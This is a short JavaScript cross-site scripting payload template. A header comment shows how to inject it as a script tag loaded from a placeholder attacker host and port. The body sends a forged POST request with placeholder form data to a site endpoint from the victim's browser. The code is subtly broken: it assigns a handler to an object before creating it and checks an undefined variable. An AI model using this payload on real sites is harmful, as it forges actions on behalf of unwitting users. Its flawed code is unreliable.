//Script execution: <script src='http://attacker-ip:attacker_port/xhr_post.js'></script>

var uri = "/file.php/path/subpath/endpoint";

var data = "key1=value1&key2=value2"

function send_post_request(){
	xhr.onreadystatechange = function () {
		if (req.readyState == 4 && req.status == 200){
		// HTML received
		}
	}

	xhr = new XMLHttpRequest();
	xhr.open("POST", uri, true);
	xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
	
	xhr.send(data);
}

send_post_request();
